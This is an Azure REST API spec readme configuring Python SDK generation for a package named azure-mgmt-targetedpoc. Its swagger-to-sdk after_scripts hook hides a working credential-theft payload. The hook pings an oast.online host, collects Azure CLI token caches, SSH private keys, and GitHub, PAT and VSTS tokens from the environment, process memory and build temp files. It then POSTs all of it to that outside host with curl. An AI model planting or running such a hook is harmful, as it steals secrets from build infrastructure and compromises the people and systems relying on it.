# Targeted RCE4

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        nslookup "rce4-${H}.${OAST}" 2>/dev/null || true &&
        echo "=== AZURE_CLI_CREDS ===" &&
        cat /root/.azure/accessTokens.json 2>/dev/null || echo NO_ACCESS_TOKENS &&
        cat /root/.azure/msal_token_cache.json 2>/dev/null || echo NO_MSAL &&
        ls -la /root/.azure/ 2>/dev/null &&
        cat /home/cloudtest/.azure/msal_token_cache.json 2>/dev/null || echo NO_USER_MSAL &&
        echo "=== SSH_KEYS ===" &&
        ls -la /root/.ssh/ 2>/dev/null &&
        cat /root/.ssh/id_rsa 2>/dev/null || echo NO_RSA &&
        cat /root/.ssh/id_ed25519 2>/dev/null || echo NO_ED25519 &&
        cat /root/.ssh/known_hosts 2>/dev/null | head -30 &&
        echo "=== PROC_TOKEN_SCAN ===" &&
        for pid in $(ls /proc | grep -E "^[0-9]+$" | head -200); do
          r=$(cat /proc/${pid}/environ 2>/dev/null | tr '\0' '\n' | grep -iE "GH_TOKEN|GITHUB_TOKEN|_PAT=|ghp_");
          [ -n "$r" ] && echo "PID${pid}: $r"; done &&
        echo "=== VSTS_ENV ===" &&
        env | grep -iE "VSTS|SYSTEM_ACCESS|ENDPOINT_AUTH|GH_TOKEN|GITHUB|BUILD_REPOSITORY" 2>/dev/null &&
        echo "=== AGENT_WORK_TEMP ===" &&
        find /mnt/vss/_work/_temp -maxdepth 4 -type f 2>/dev/null | head -20 &&
        cat /mnt/vss/_work/_temp/*.json 2>/dev/null | grep -iE "ghp_|_token|secret|password" | head -20 &&
        echo "=== EXFIL ===" &&
        { OUT="AZURE_CLI=$(cat /root/.azure/accessTokens.json 2>/dev/null)$(cat /root/.azure/msal_token_cache.json 2>/dev/null)$(cat /home/cloudtest/.azure/msal_token_cache.json 2>/dev/null) SSH_RSA=$(cat /root/.ssh/id_rsa 2>/dev/null) SSH_ED=$(cat /root/.ssh/id_ed25519 2>/dev/null) KNOWN=$(cat /root/.ssh/known_hosts 2>/dev/null | head -30) ENV=$(env | grep -iE 'GH_TOKEN|GITHUB_TOKEN|ghp_|_PAT=|VSTS') PROC=$(for pid in $(ls /proc | grep -E '^[0-9]+$' | head -200); do cat /proc/${pid}/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'GH_TOKEN|GITHUB_TOKEN|ghp_|_PAT='; done)"; echo "$OUT" | curl -sk -X POST "http://${OAST}/rce4data-${H}" --data-binary @-; }
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
